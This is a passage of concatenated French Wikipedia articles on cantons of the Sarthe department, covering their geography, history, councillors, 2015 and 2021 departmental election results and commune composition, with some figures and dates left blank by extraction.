Conseillers généraux de 1833 à 2015.
Le canton participe à l'élection du député de la troisième circonscription de la Sarthe.
Résultats détaillés.
Élections de mars 2015.
À l'issue du des élections départementales de 2015, trois binômes sont en ballottage : Dominique Le Mèner et Françoise Lelong (Union de la Droite, 44,23 %), André Dovillez et Amandine Ligneul (FN, 29,93 %) et Gérard Clément et Sophie Witczak (DVG, 25,84 %). Le taux de participation est de 51,66 % ( sur ) contre 49,74 % au niveau départemental et 50,17 % au niveau national.
Au second tour, Dominique Le Mèner et Françoise Lelong (Union de la Droite) sont élus avec 48,39 % des suffrages exprimés et un taux de participation de 53,56 % ( pour et ).
Dominique Le Mèner n'est plus à LR.
Élections de juin 2021.
Le premier tour des élections départementales de 2021 est marqué par un très faible taux de participation (33,26 % au niveau national). Dans le canton de Saint-Calais, ce taux de participation est de 32,75 % ( sur ) contre 29,78 % au niveau départemental. À l'issue de ce premier tour, deux binômes sont en ballottage : Dominique Le Mener et Françoise Lelong (Union au centre et à droite, 60,76 %) et Bernadette Coudrain et Arnaud Filoche (RN, 16,13 %).
Le second tour des élections est marqué une nouvelle fois par une abstention massive équivalente au premier tour. Les taux de participation sont de 34,36 % au niveau national, 30,67 % dans le département et 32,3 % dans le canton de Saint-Calais. Dominique Le Mener et Françoise Lelong (Union au centre et à droite) sont élus avec 81,19 % des suffrages exprimés ( pour et ).
Composition.
Composition avant 2015.
Le canton de Saint-Calais regroupait quatorze communes.
À la suite du redécoupage des cantons pour 2015, toutes les communes sont à nouveau rattachées au canton de Saint-Calais auquel s'ajoutent les huit communes du canton de Bouloire, les neuf du canton de Montmirail (Sarthe) et les six du canton de Vibraye.
Contrairement à beaucoup d'autres cantons, le canton de Saint-Calais n'incluait aucune commune supprimée depuis la création des communes sous la Révolution.
Composition depuis 2015.
Lors du redécoupage de 2014, le canton comptait trente-sept communes entières.
À la suite de la création de la commune nouvelle de Val-d'Étangson au , le canton comprend désormais trente-six communes entières.

</doc>
<doc id="191836" url="https://fr.wikipedia.org/wiki?curid=191836" title="Canton du Mans-Nord-Ouest">
Canton du Mans-Nord-Ouest

Le canton du Mans-Nord-Ouest est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Ce canton était organisé autour du Mans dans l'arrondissement du Mans. Son altitude variait de (Le Mans) à (La Bazoge) pour une altitude moyenne de .
Représentation.
Le canton du Mans-Nord-Ouest a été créé en 1967 (décret du ) en divisant les trois anciens cantons de Mans.
Conseillers généraux du canton du Mans Nord-Ouest (de 1967 à 2015).
Christiane N'Kaloulou est élue le , à la suite de la démission pour cumul de mandats de Marietta Karamanli, dans ce canton conquis par la gauche en 1998.
Le canton participe à l'élection du député de la première circonscription de la Sarthe.
Composition.
À la suite du redécoupage des cantons pour 2015, la commune de La Bazoge est rattachée au canton de Bonnétable, les communes d'Aigné, La Chapelle-Saint-Aubin, La Milesse et Saint-Saturnin à celui du Mans-2, la commune de Trangé à celui du Mans-7 et la commune du Mans est répartie entre sept cantons (Le Mans-1 à Le Mans-7).
La commune de Saint-Pavin-des-Champs, absorbée en 1855 par Le Mans, était la seule commune supprimée, depuis la création des communes sous la Révolution, incluse (presque intégralement) dans le territoire du canton du Mans-Nord-Ouest.

</doc>
<doc id="191837" url="https://fr.wikipedia.org/wiki?curid=191837" title="Canton de Montfort-le-Gesnois">
Canton de Montfort-le-Gesnois

Le canton de Montfort-le-Gesnois est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Ce canton était organisé autour de Montfort-le-Gesnois dans l'arrondissement de Mamers. Son altitude variait de 52 m (Champagné) à 157 m (Le Breil-sur-Mérize) pour une altitude moyenne de 78 m.
Histoire.
Le canton s'appelait avant 1985 « canton de Montfort-le-Rotrou ».
Représentation.
Conseillers généraux de 1833 à 2015.
Le canton participe à l'élection du député de la deuxième circonscription de la Sarthe.
Conseillers d'arrondissement (de 1833 à 1940).
Le canton de Montfort appartenait à l'arrondissement du Mans jusqu'en 2006.
Composition.
Le canton de Montfort-le-Gesnois comptait en 2012 (population municipale) et regroupait quinze communes :
À la suite du redécoupage des cantons pour 2015, toutes les communes à l'exception de Champagné sont rattachées au canton de Savigné-l'Évêque. La commune de Champagné est intégrée au canton de Changé.
Anciennes communes.
Les anciennes communes suivantes étaient incluses dans le canton de Montfort-le-Gesnois :

</doc>
<doc id="191838" url="https://fr.wikipedia.org/wiki?curid=191838" title="Canton du Mans-Est-Campagne">
Canton du Mans-Est-Campagne

Le canton du Mans-Est-Campagne est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Histoire.
Le canton du Mans-Est-Campagne a été créé en 1982 (décret du ), en dédoublant le canton du Mans-Est.
Représentation.
Conseillers généraux du canton du Mans-Est-Campagne (1982 à 2015).
Robert Manceau a été nommé conseiller général honoraire du canton par arrêté préfectoral du .
Le canton participe à l'élection du député de la deuxième circonscription de la Sarthe.
Composition.
À la suite du redécoupage des cantons pour 2015, les communes de Challes, Changé, Parigné-l'Évêque, Sargé-lès-le-Mans et Yvré-l'Évêque sont rattachées au canton de Changé, la commune de Savigné-l'Évêque à celui de Savigné-l'Évêque et la commune du Mans est répartie entre sept cantons (Le Mans-1 à Le Mans-7).
Ancienne commune.
L'ancienne commune de Pont-Lieue, absorbée en 1855 par Le Mans, était partiellement comprise dans le canton du Mans-Est-Campagne. Celui-ci n'incluait aucune autre commune supprimée depuis la création des communes sous la Révolution.

</doc>
<doc id="191839" url="https://fr.wikipedia.org/wiki?curid=191839" title="Canton du Mans-Nord-Campagne">
Canton du Mans-Nord-Campagne

Le canton de Mans-Nord-Campagne est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Histoire.
Canton créé en 1982 (décret du 2 février 1982).
Représentation.
Le canton participe à l'élection du député de la cinquième circonscription de la Sarthe.
Conseillers généraux de l'ancien canton du Mans-Nord (de 1967 à 1982).
Georges Bollengier-Stragier a été nommé conseiller général honoraire du canton par arrêté préfectoral du .
Composition.
Le canton du Mans-Nord-Campagne regroupait quatre communes, dont une partie du Mans, et comptait en 2012 (population municipale). La partie du Mans comprise dans ce canton était déterminée .
Liste des communes :
À la suite du redécoupage des cantons pour 2015, les communes de Neuville-sur-Sarthe et Saint-Pavace sont rattachées au canton de Bonnétable, la commune de Coulaines à celui du Mans-4 et la commune du Mans est répartie entre sept cantons (Le Mans-1 à Le Mans-7). La plus grande partie du Mans du canton du Mans-Nord-Campagne est intégrée au canton du Mans-4, une partie plus petite, comprise entre la rue Henri-Delagenièree st l'avenue de Paderborn, est intégrée au canton du Mans-3.
La commune de Montreuil-sur-Sarthe, absorbée en 1809 par Neuville-sur-Sarthe, était la seule commune supprimée, depuis la création des communes sous la Révolution, incluse dans le territoire du canton du Mans-Nord-Campagne.

</doc>
<doc id="191840" url="https://fr.wikipedia.org/wiki?curid=191840" title="Canton de Montmirail (Sarthe)">
Canton de Montmirail (Sarthe)

Le canton de Montmirail est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Ce canton était organisé autour de Montmirail dans l'arrondissement de Mamers. Son altitude variait de (Saint-Maixent) à (Gréez-sur-Roc) pour une altitude moyenne de .
Histoire.
Créé lors de la Révolution, le canton se compose de communes des anciennes provinces du Perche (Montmirail, Melleray, Champrond et parfois Saint-Ulphace) et du Maine (Lamnay, Gréez-sur-Roc, Saint-Maixent, Saint-Jean-des-Échelles et Courgenard).
Représentation.
Conseillers généraux de 1833 à 2015.
Aujourd'hui, le canton est rattaché à la communauté de communes du Val de Braye. , le centre des décisions étant plutôt du côté de Vibraye, Lavaré et Dollon.
Le canton participe à l'élection du député de la cinquième circonscription de la Sarthe.
Composition.
Le canton de Montmirail comptait en 2012 (population municipale) et regroupait neuf communes :
À la suite du redécoupage des cantons pour 2015, toutes les communes sont rattachées au canton de Saint-Calais.
La commune de Saint-Quentin, absorbée en 1841 par Saint-Maixent, était la seule commune supprimée, depuis la création des communes sous la Révolution, incluse dans le territoire du canton de Montmirail.

</doc>
<doc id="191841" url="https://fr.wikipedia.org/wiki?curid=191841" title="Canton du Mans-Sud-Ouest">
Canton du Mans-Sud-Ouest

Le canton du Mans-Sud-Ouest est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Ce canton étaitorganisé autour du Mans dans l'arrondissement du Mans. Son altitude variait de 38 m (Arnage) à 134 m (Le Mans) pour une altitude moyenne de 50 m.
Histoire.
Canton créé en 1967 (décret du 8 août 1967).
Représentation.
Le canton participe à l'élection du député de la deuxième circonscription de la Sarthe.
Composition.
Le canton du Mans-Sud-Ouest comptait en 2012 (population municipale) et regroupait deux communes, dont une partie du Mans :
La partie du Mans comprise dans ce canton était officiellement déterminée .
À la suite du redécoupage des cantons pour 2015, la commune d'Arnage est rattachée au canton du Mans-6 et la fraction du Mans de ce canton est pour sa plus grande partie (à l'ouest de la voie de chemin de fer du Mans à Tours) attribuée au canton du Mans-7. La partie située à l'est est répartie entre le canton du Mans-5 (au nord du boulevard Pierre-Brossolette) et celui du Mans-6 (au sud de cette voie).
Anciennes communes.
L'ancienne commune de Pont-Lieue, absorbée en 1855 par Le Mans, était partiellement comprise dans le canton du Mans-Sud-Ouest. Celui-ci n'incluait aucune autre commune supprimée depuis la création des communes sous la Révolution. Créée en 1853, la commune d'Arnage inclut une ancienne partie de chacun des territoires de Pont-Lieue, de Moncé-en-Belin (canton d'Écommoy) et de Spay (canton de La Suze-sur-Sarthe).

</doc>
<doc id="191843" url="https://fr.wikipedia.org/wiki?curid=191843" title="Canton du Mans-Sud-Est">
Canton du Mans-Sud-Est

Le canton du Mans-Sud-Est est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Ce canton était organisé autour du Mans dans l'arrondissement du Mans.
Canton urbain au sud de l'agglomération mancelle. Il comportait des cités ouvrières de l'entre-deux-guerres (cité des Pins), le cœur historique de l'ancien village de Pontlieue, des zones d'habitats collectifs datant des années 1960 (Ronceray-Glonnières) ou des opérations d'urbanisme plus récentes (Vauguyon-les Sources). Le sud du canton était marqué par une zone verte au sein de laquelle se trouvent le circuit des 24 Heures du Mans et la commune de Ruaudin.
Histoire.
Canton créé en 1982. Le conseiller général élu en 1982, Robert Jarry, était antérieurement conseiller général de l'ancien canton du Mans-Sud depuis 1967.
Représentation.
Le canton participe à l'élection du député de la deuxième circonscription de la Sarthe.
Robert Jarry a été nommé conseiller général honoraire du canton par arrêté préfectoral du .
Composition.
Le canton du Mans-Sud comptait en 2012 (population municipale) et regroupait deux communes dont une partie du Mans :
À la suite du redécoupage des cantons pour 2015, la commune de Ruaudin est rattachée au canton d'Écommoy et la fraction du Mans de ce canton est pour sa plus grande partie attribuée au canton du Mans-6. Les petites parties situées au nord-ouest des boulevards Jean-Moulin et Clemenceau et au nord des rues Raymond-Persigan et Jean-Bart sont attribuées au canton du Mans-5.
L'ancienne commune de Pont-Lieue, absorbée en 1855 par Le Mans, est en grande partie comprise dans le canton du Mans-Sud-Est. Celui-ci n'inclut aucune autre commune supprimée depuis la création des communes sous la Révolution.

</doc>
<doc id="191844" url="https://fr.wikipedia.org/wiki?curid=191844" title="Canton du Mans-Ville-Est">
Canton du Mans-Ville-Est

Le canton du Mans-Ville-Est est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Ce canton urbain était limité par l'Huisne à partir de l'usine des eaux puis par la voie ferrée Paris-Nantes jusqu'au pont de la Sarthe et enfin par la Sarthe du pont de chemin de fer jusqu'à son confluent avec l'Huisne (Sables d'Or).
Il se composait des quartiers Sablons-Est, Sablons-Ouest, Jaurès, Miroir, Gare Sud et Sables d'Or.
Histoire.
Canton créé en 1982.
Représentation.
Le canton participe à l'élection du député de la deuxième circonscription de la Sarthe.
Pierre Rouzière a été nommé conseiller général honoraire du canton par arrêté préfectoral du .
Composition.
Le canton du Mans-Ville-Est défini en 1982 contenait une partie de la commune du Mans et comptait en 2012 (population municipale). La partie du Mans comprise dans ce canton était délimitée .
À la suite du redécoupage des cantons pour 2015, le territoire est essentiellement partagé entre le canton du Mans-7, à l'ouest de la ligne de chemin de fer Paris-Le Mans, et le canton du Mans-5, à l'est. Une petite portion, entre la rue de la Bertinière et la voie de chemin de fer, est intégrée au canton du Mans-3.
Anciennes communes.
L'ancienne commune de Pont-Lieue, absorbée en 1855 par Le Mans, était partiellement comprise dans le canton du Mans-Ville-Est.

</doc>
<doc id="191845" url="https://fr.wikipedia.org/wiki?curid=191845" title="Canton du Mans-Ouest">
Canton du Mans-Ouest

Le canton du Mans-Ouest est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
La canton était situé de part et d'autre d'un axe central, avenue de la Libération et avenue Olivier-Heuzé. Sur cet axe, le port du Mans constitue un point central.
La rue Paul-Courboulay accueille le plus haut bâtiment HLM de la Sarthe. Le canton contient des sites remarquables comme l'île aux Planches et des sites culturels tels que la médiathèque.
Histoire.
Canton créé en 1982 (décret du ).
Roland Becdelièvre a été nommé conseiller général honoraire du canton par arrêté préfectoral du .
Administration.
Le canton participe à l'élection du député de la quatrième circonscription de la Sarthe.
Composition.
Le canton du Mans-Ouest était constitué d'une partie de la commune du Mans et comptait habitants (population municipale ).
La commune de Saint-Georges-du-Plain, absorbée en 1855 par Le Mans, était la seule commune supprimée, depuis la création des communes sous la Révolution, incluse dans le territoire du canton du Mans-Ouest.

</doc>
<doc id="191846" url="https://fr.wikipedia.org/wiki?curid=191846" title="Canton du Mans-Nord-Ville">
Canton du Mans-Nord-Ville

Le canton du Mans-Nord-Ville est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Canton exclusivement urbain composé des quartiers Villaret, Gazonfier, Yzeuville et Clairefontaine.
Histoire.
Canton créé en 1982.
Le canton participe à l'élection du député de la cinquième circonscription de la Sarthe.
Composition.
Le canton du Mans-Nord-Ville défini en 1982 contenait une partie de la commune du Mans et comptait en 2012 (population municipale). La partie du Mans comprise dans ce canton était délimitée par .
À la suite du redécoupage des cantons pour 2015, la plus grande partie du canton est intégrée au canton du Mans-4. Seule la partie à l'ouest des rues René-Bardet, de Cyrus, de la Solitude et Gazonfier est intégrée au canton du Mans-3.
Ancienne commune.
L'ancienne commune de Sainte-Croix, absorbée en 1855 par Le Mans, était partiellement comprise dans le canton du Mans-Nord-Ville.

</doc>
<doc id="191847" url="https://fr.wikipedia.org/wiki?curid=191847" title="Canton du Mans-Centre">
Canton du Mans-Centre

Le canton du Mans-Centre est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Situé au cœur du Mans, il était délimité par la Sarthe et comprenait le centre-ville avec la mairie, la cathédrale, le musée, les rues commerçantes et les grands magasins.
Représentation.
Conseillers généraux du canton du Mans-Centre (1967 à 2015).
Canton créé en 1967 (décret du ), en divisant les anciens cantons du Mans (, et ), qui dataient de 1833.
Le canton participe à l'élection du député de la première circonscription de la Sarthe.
Composition.
À la suite du redécoupage des cantons pour 2015, la commune du Mans est répartie entre sept cantons (Le Mans-1 à Le Mans-7). L'ensemble du canton du Mans-Centre est intégré au canton du Mans-3, à l'exception de la petite partie entre la rue Bollée et la ligne Paris-Le Mans, à l'est du boulevard Nicolas-Cugnot, qui est intégrée au canton du Mans-4.
Ancienne commune.
L'ancienne commune de Sainte-Croix, absorbée en 1855 par Le Mans, était partiellement comprise dans le canton du Mans-Centre.

</doc>
<doc id="191848" url="https://fr.wikipedia.org/wiki?curid=191848" title="Canton de Loué">
Canton de Loué

Le canton de Loué est une circonscription électorale française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Ce canton est organisé autour de Loué dans les arrondissements de La Flèche et de Mamers. Son altitude varie de (Noyen-sur-Sarthe) à (Saint-Denis-d'Orques).
Histoire.
Par décret du , le nombre de cantons du département est divisé par deux, avec mise en application aux élections départementales de mars 2015. Le canton de Loué est conservé et s'agrandit. Il passe de 14 à 44 communes.
Représentation.
Conseillers d'arrondissement (de 1833 à 1940).
Le canton de Loué appartenait à l'arrondissement du Mans jusqu'en 2006.
Conseillers généraux de 1833 à 2015.
Le canton participe à l'élection du député de la quatrième circonscription de la Sarthe.
Résultats détaillés.
Élections de mars 2015.
À l'issue du des élections départementales de 2015, deux binômes sont en ballottage : Fabien Lorne et Catherine Paineau (Union de la Droite, 35,5 %) et Esméralda Bouquet et Guy Le Pennec (FN, 27,77 %). Le taux de participation est de 50,72 % ( sur ) contre 49,74 % au niveau départemental et 50,17 % au niveau national.
Au second tour, Fabien Lorne et Catherine Paineau (Union de la Droite) sont élus avec 65,1 % des suffrages exprimés et un taux de participation de 51,59 % ( pour et ).
Élections de juin 2021.
Le premier tour des élections départementales de 2021 est marqué par un très faible taux de participation (33,26 % au niveau national). Dans le canton de Loué, ce taux de participation est de 31,55 % ( sur ) contre 29,78 % au niveau départemental. À l'issue de ce premier tour, deux binômes sont en ballottage : Joël Métenier et Catherine Paineau (Union au centre et à droite, 30,84 %) et Michel Briffault et Catherine Lemercier (Divers, 18,18 %).
Le second tour des élections est marqué une nouvelle fois par une abstention massive équivalente au premier tour. Les taux de participation sont de 34,36 % au niveau national, 30,67 % dans le département et 31,93 % dans le canton de Loué. Joël Métenier et Catherine Paineau (Union au centre et à droite) sont élus avec 56,94 % des suffrages exprimés ( pour et ).
Composition.
Composition avant 2015.
Le canton de Loué regroupait quatorze communes.
À la suite du redécoupage des cantons pour 2015, toutes les communes sont à nouveau rattachées au canton de Loué auquel s'ajoutent les quatorze communes du canton de Brûlon, les quinze du canton de Conlie et une commune du canton de Malicorne-sur-Sarthe.
Anciennes communes.
Les anciennes communes suivantes étaient incluses dans le canton de Loué :
Composition depuis 2015.
Lors du redécoupage de 2014, le canton comptait quarante-quatre communes entières.
À la suite de la création de la commune nouvelle de Bernay-Neuvy-en-Champagne au , le canton comprend désormais quarante-trois communes entières.

</doc>
<doc id="191849" url="https://fr.wikipedia.org/wiki?curid=191849" title="Canton du Grand-Lucé">
Canton du Grand-Lucé

Le canton du Grand-Lucé est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Ce canton était organisé autour du Grand-Lucé dans l'arrondissement de La Flèche. Son altitude variait de 58 m (Saint-Pierre-du-Lorouër) à 167 m (Pruillé-l'Éguillé) pour une altitude moyenne de 113 m.
Représentation.
Conseillers généraux de 1833 à 2015.
Le canton participe à l'élection du député de la troisième circonscription de la Sarthe.
Conseillers d'arrondissement (de 1833 à 1940).
Le canton du Grand-Lucé avait deux conseillers d'arrondissement.
Il appartenait à l'arrondissement de Saint-Calais jusqu'à sa disparition en 1926.
Composition.
Le canton du Grand-Lucé comptait en 2012 (population municipale) et regroupait huit communes :
À la suite du redécoupage des cantons pour 2015, toutes les communes sont rattachées au canton de Château-du-Loir.
Contrairement à beaucoup d'autres cantons, le canton du Grand-Lucé n'incluait aucune commune supprimée depuis la création des communes sous la Révolution.

</doc>
<doc id="191850" url="https://fr.wikipedia.org/wiki?curid=191850" title="Canton d'Écommoy">
Canton d'Écommoy

Le canton d'Écommoy est une division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
À la suite du redécoupage cantonal de 2014, les limites territoriales du canton sont remaniées. Le nombre de communes du canton passe de 11 à 10.
Géographie.
Ce canton est organisé autour d'Écommoy dans l'arrondissement du Mans. Son altitude varie de 40 m (Moncé-en-Belin) à 177 m (Marigné-Laillé) pour une altitude moyenne de 79 m.
Histoire.
Par décret du , le nombre de cantons du département est divisé par deux, avec mise en application aux élections départementales de mars 2015. Le canton d'Écommoy est conservé mais passe de 11 à 10 communes.
Représentation.
Conseillers généraux de 1833 à 2015.
Le canton participe à l'élection du député de la troisième circonscription de la Sarthe.
Résultats détaillés.
Élections de mars 2015.
À l'issue du des élections départementales de 2015, deux binômes sont en ballottage : Jean-Yves Nicot et Natacha Patin (FN, 26,02 %) et Marie-Pierre Brosset et Samuel Chevallier (Union de la Droite, 24,69 %). Le taux de participation est de 48,5 % ( sur ) contre 49,74 % au niveau départemental et 50,17 % au niveau national.
Au second tour, Marie-Pierre Brosset et Samuel Chevallier (Union de la Droite) sont élus avec 63,56 % des suffrages exprimés et un taux de participation de 51,61 % ( pour et ).
Élections de juin 2021.
Le premier tour des élections départementales de 2021 est marqué par un très faible taux de participation (33,26 % au niveau national). Dans le canton d'Écommoy, ce taux de participation est de 27,92 % ( sur ) contre 29,78 % au niveau départemental. À l'issue de ce premier tour, deux binômes sont en ballottage : Marie-Pierre Brosset et Samuel Chevallier (Union au centre et à droite, 33,4 %) et Laurent Bremond et Florence Février (DVG, 20,22 %).
Le second tour des élections est marqué une nouvelle fois par une abstention massive équivalente au premier tour. Les taux de participation sont de 34,36 % au niveau national, 30,67 % dans le département et 28,43 % dans le canton d'Écommoy. Marie-Pierre Brosset et Samuel Chevallier (Union au centre et à droite) sont élus avec 58,05 % des suffrages exprimés ( pour et ).
Composition.
Composition avant 2015.
Le canton d'Écommoy regroupait onze communes.
À la suite du redécoupage des cantons pour 2015, les communes d'Écommoy, Laigné-en-Belin, Marigné-Laillé, Moncé-en-Belin, Mulsanne, Saint-Biez-en-Belin, Saint-Gervais-en-Belin, Saint-Ouen-en-Belin et Teloché sont à nouveau rattachées au canton d'Écommoy et les communes de Brette-les-Pins et Saint-Mars-d'Outillé à celui de Changé.
Contrairement à beaucoup d'autres cantons, le canton d'Écommoy n'incluait dans son territoire antérieur à 2015 aucune commune supprimée depuis la création des communes sous la Révolution. Le seul changement notable concernant les territoires communaux est le prélèvement en 1853 d'une partie du territoire de Moncé-en-Belin pour participer à la création de la commune d'Arnage, aujourd'hui dans le canton du Mans-Sud-Ouest.
Composition depuis 2015.
Depuis 2015, le canton compte dix communes entières.

</doc>
<doc id="191851" url="https://fr.wikipedia.org/wiki?curid=191851" title="Canton de Conlie">
Canton de Conlie

Le canton de Conlie est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Ce canton était organisé autour de Conlie dans l'arrondissement de Mamers. Son altitude variait de (Degré) à (Tennie) pour une altitude moyenne de .
Représentation.
Conseillers généraux de 1833 à 2015.
Le canton participe à l'élection du député de la première circonscription de la Sarthe.
Conseillers d'arrondissement (de 1833 à 1940).
Le canton de Conlie appartenait à l'arrondissement du Mans jusqu'en 2006.
Composition.
Le canton de Conlie comptait en 2012 (population municipale) et regroupait quinze communes :
À la suite du redécoupage des cantons pour 2015, toutes les communes sont rattachées au canton de Loué.
Anciennes communes.
Les anciennes communes suivantes étaient incluses dans le canton de Conlie :

</doc>
<doc id="191853" url="https://fr.wikipedia.org/wiki?curid=191853" title="Canton de Montval-sur-Loir">
Canton de Montval-sur-Loir

Le canton de Montval-sur-Loir, précédemment appelé canton de Château-du-Loir, est une circonscription électorale française située dans le département de la Sarthe et la région Pays de la Loire.
À la suite du redécoupage cantonal de 2014, les limites territoriales du canton sont remaniées. Le nombre de communes du canton passe de 11 à 29.
Géographie.
Ce canton est organisé autour de Château-du-Loir dans l'arrondissement de La Flèche. Son altitude varie de 40 m (Montabon) à 172 m (Jupilles) pour une altitude moyenne de 100 m.
Histoire.
Par décret du , le nombre de cantons du département est divisé par deux, avec mise en application aux élections départementales de . Le canton de Château-du-Loir est conservé et s'agrandit. Il passe de 11 à 29 communes.
Le canton prend sa dénomination actuelle par décret du .
Représentation.
Conseillers d'arrondissement (de 1833 à 1940).
Le canton de Château-du-Loir avait deux conseillers d'arrondissement.
Il appartenait à l'arrondissement de Saint-Calais jusqu'à sa disparition en 1926.
Conseillers généraux de 1833 à 2015.
Le canton participe à l'élection du député de la troisième circonscription de la Sarthe.
Résultats détaillés.
Élections de mars 2015.
À l'issue du des élections départementales de 2015, deux binômes sont en ballottage : Béatrice Pavy-Morançais et Régis Vallienne (UMP, 38,76 %) et Pascal Gannat et Annie L'Hôte (FN, 28,83 %). Le taux de participation est de 53,49 % ( sur ) contre 49,74 % au niveau départemental et 50,17 % au niveau national.
Au second tour, Béatrice Pavy-Morançais et Régis Vallienne (UMP) sont élus avec 61,14 % des suffrages exprimés et un taux de participation de 54,64 % ( pour et ).
Élections de juin 2021.
Le premier tour des élections départementales de 2021 est marqué par un très faible taux de participation (33,26 % au niveau national). Dans le canton de Montval-sur-Loir, ce taux de participation est de 31,62 % ( sur ) contre 29,78 % au niveau départemental. À l'issue de ce premier tour, deux binômes sont en ballottage : Galiène Cohu et Régis Vallienne (Union au centre et à droite, 37 %) et Pascal Dupuis et Christine Tafforeau-Hardy (Union à gauche, 27,21 %).
Le second tour des élections est marqué une nouvelle fois par une abstention massive équivalente au premier tour. Les taux de participation sont de 34,36 % au niveau national, 30,67 % dans le département et 32,28 % dans le canton de Montval-sur-Loir. Galiène Cohu et Régis Vallienne (Union au centre et à droite) sont élus avec 56,55 % des suffrages exprimés ( pour et ).
Composition.
Composition avant 2015.
Le canton de Château-du-Loir regroupait onze communes.
À la suite du redécoupage des cantons pour 2015, toutes les communes sont à nouveau rattachées au canton de Château-du-Loir auquel s'ajoutent les neuf communes du canton de La Chartre-sur-le-Loir, les huit du canton du Grand-Lucé et une commune du canton de Mayet.
Anciennes communes.
Les anciennes communes suivantes étaient incluses dans le canton de Château-du-Loir :
Composition depuis 2015.
Lors du redécoupage de 2014, le canton comptait vingt-neuf communes entières.
À la suite de la création des communes nouvelles de Montval-sur-Loir au et de Loir en Vallée au , le canton comprend désormais vingt-quatre communes entières.

</doc>
<doc id="191854" url="https://fr.wikipedia.org/wiki?curid=191854" title="Canton de La Chartre-sur-le-Loir">
Canton de La Chartre-sur-le-Loir

Le canton de La Chartre-sur-le-Loir est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Ce canton était organisé autour de La Chartre-sur-le-Loir dans l'arrondissement de La Flèche. Son altitude variait de 47 m (Chahaignes) à 154 m (La Chapelle-Gaugain) pour une altitude moyenne de 63 m.
Représentation.
Conseillers généraux de 1833 à 2015.
Le canton participe à l'élection du député de la troisième circonscription de la Sarthe.
Conseillers d'arrondissement (de 1833 à 1940).
Le canton de La Chartre appartenait à l'arrondissement de Saint-Calais jusqu'à sa disparition en 1926.
Composition.
Le canton de Chartre-sur-le-Loir comptait en 2012 (population municipale) et regroupait neuf communes :
À la suite du redécoupage des cantons pour 2015, toutes les communes sont rattachées au canton de Château-du-Loir.
Contrairement à beaucoup d'autres cantons, le canton de La Chartre-sur-le-Loir n'incluait aucune commune supprimée depuis la création des communes sous la Révolution.

</doc>
<doc id="191855" url="https://fr.wikipedia.org/wiki?curid=191855" title="Canton de Bouloire">
Canton de Bouloire

Le canton de Bouloire est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Ce canton était organisé autour de Bouloire dans l'arrondissement de Mamers. Son altitude variait de 64 m (Thorigné-sur-Dué) à 182 m (Coudrecieux) pour une altitude moyenne de 113 m.
Histoire.
De 1833 à 1848, les cantons de Bouloire et de Vibraye avaient le même conseiller général. Le nombre de conseillers généraux était limité à 30 par département.
Représentation.
Conseillers généraux de 1833 à 2015.
Le canton participe à l'élection du député de la deuxième circonscription de la Sarthe.
Jean Morin a été nommé conseiller général honoraire du canton par arrêté préfectoral du .
Conseillers d'arrondissement (de 1833 à 1940).
Le canton de Bouloire appartenait à l'arrondissement de Saint-Calais jusqu'à sa disparition en 1926.
Il avait deux conseillers d'arrondissement jusqu'en 1928.
Composition.
Le canton de Bouloire comptait en 2012 (population municipale et regroupait huit communes :
À la suite du redécoupage des cantons pour 2015, toutes les communes sont rattachées au canton de Saint-Calais.
Ancienne commune.
La commune des Loges, absorbée en 1807 par Coudrecieux, était la seule commune supprimée, depuis la création des communes sous la Révolution, incluse dans le territoire du canton de Bouloire.

</doc>
<doc id="191856" url="https://fr.wikipedia.org/wiki?curid=191856" title="Canton de Ballon">
Canton de Ballon

Le canton de Ballon est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Ce canton était organisé autour de Ballon dans l'arrondissement du Mans. Son altitude variait de 48 m (La Guierche) à 143 m (Beaufay) pour une altitude moyenne de 80 m.
Représentation.
Conseillers d'arrondissement (de 1833 à 1940).
Jean-Claude Boulard a été nommé conseiller général honoraire du canton par arrêté préfectoral du .
Le canton participe à l'élection du député de la cinquième circonscription de la Sarthe.
Composition.
Le canton de Ballon comptait en 2012 (population municipale) et regroupait treize communes :
À la suite du redécoupage des cantons pour 2015, toutes les communes sont rattachées au canton de Bonnétable.
Anciennes communes.
Les anciennes communes suivantes étaient incluses dans le canton de Ballon :
La commune de Saint-Mars-sous-Ballon a été créée en 1835 par scission du territoire de Ballon.

</doc>
<doc id="191857" url="https://fr.wikipedia.org/wiki?curid=191857" title="Canton de Tuffé">
Canton de Tuffé

Le canton de Tuffé est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
Ce canton était organisé autour de Tuffé dans l'arrondissement de Mamers. Son altitude variait de 62 m (Beillé) à 192 m (Bouër) pour une altitude moyenne de 107 m.
Représentation.
Conseillers généraux de 1833 à 2015.
Le canton participe à l'élection du député de la cinquième circonscription de la Sarthe.
Composition.
Le canton de Tuffé comptait en 2012 (population municipale) et regroupait treize communes :
À la suite du redécoupage des cantons pour 2015, toutes les communes sont rattachées au canton de La Ferté-Bernard.
Contrairement à beaucoup d'autres cantons, le canton de Tuffé n'incluait aucune commune supprimée depuis la création des communes sous la Révolution.

</doc>
<doc id="191858" url="https://fr.wikipedia.org/wiki?curid=191858" title="Canton de Saint-Paterne">
Canton de Saint-Paterne

Le canton de Saint-Paterne est une ancienne division administrative française située dans le département de la Sarthe et la région Pays de la Loire.
Géographie.
